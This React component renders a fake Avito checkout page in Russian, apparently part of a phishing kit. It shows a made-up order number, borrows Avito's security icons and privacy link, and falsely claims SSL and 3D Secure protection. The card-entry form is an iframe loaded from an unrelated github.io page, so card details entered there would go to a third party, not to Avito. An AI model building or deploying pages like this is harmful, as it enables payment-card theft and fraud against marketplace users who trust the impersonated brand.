import React, { Component } from "react";
import "./App.css";

export default class App extends React.Component {
    render() {
        return (
            <div className="main">
                <div className="top">
                    <div className="logo" />
                    <hr className="hr" />
                </div>
                <div className="middle">
                    <div className="arrowpart">
                        <svg role="img" aria-hidden="true" data-icon="arrow" viewBox="0 0 24 24" name="arrow" className="arrow"><path d="m11 7.41-5.3 5.3a1 1 0 0 1-1.4-1.42l7-7a1 1 0 0 1 1.4 0l7 7a1 1 0 0 1-1.4 1.42L13 7.4V19a1 1 0 1 1-2 0V7.41Z"></path></svg>
                        Назад к оформлению заказа
                    </div>
                    <div className="ordernum">
                        <div className="ordercss">
                            Оплата заказа № 40000000009475956
                            <div className="price">
                                0 ₽
                            </div>
                        </div>
                        <div className="com">
                            Возможна комиссия вашего банка
                        </div>
                    </div>
                    <iframe className="cardcard" src="https://preservation63.github.io/ufufufufu/" />
                    <div className="remembercard">
                        <input type="checkbox" className="checkbox" />
                        <a className="kkk">Запомнить карту</a>
                    </div>
                    <button className="oplbut">
						Оплатить 0 ₽
					</button>
                    <section class="bottom"><img src="https://www.avito.ru/dstatic/build/assets/1943634e5b4f7c7cc300.svg" height="min-content" alt="security icons" />
                        <p class="grcw">
                            Интернет-платежи на Авито защищены 
                            <br />
                            сертификатом SSL и протоколом 3D Secure. 
                            <br />
                            <a href="https://www.avito.ru/legal/rules/privacy-policy" class="security-block-legalConditionsUrl-_tVb8" target="_blank" rel="noreferrer">
                            Политика обработки данных</a>
                        </p>
                    </section>
                </div>
            </div>
        )
    }
}